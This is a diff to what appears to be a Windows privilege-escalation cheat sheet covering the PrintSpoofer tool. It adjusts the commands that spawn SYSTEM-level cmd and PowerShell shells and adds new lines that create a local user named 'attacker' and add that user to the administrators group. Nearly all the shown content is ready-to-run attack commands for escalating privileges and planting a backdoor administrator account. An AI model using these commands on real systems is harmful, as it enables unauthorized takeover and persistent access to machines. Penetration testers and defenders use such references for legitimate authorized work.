@@ -99,14 +99,27 @@ Works on many **Windows 10 and Windows Server builds** by abusing the **Print Sp
 **Execute:**
 
 ```powershell
-PrintSpoofer.exe -i -c cmd
+.\PrintSpoofer.exe -i -c cmd
 ```
 
 **Spawn PowerShell:**
 
 ```powershell
-PrintSpoofer.exe -i -c powershell
+.\PrintSpoofer.exe -i -c powershell
 ```
+
+**Create user:**
+
+```powershell
+.\PrintSpoofer.exe "net user attacker Pass123! /add"
+```
+
+**Add to administrators:**
+
+```powershell
+.\PrintSpoofer.exe "net localgroup administrators attacker /add"
+```
+
 
 ### JuicyPotato
 
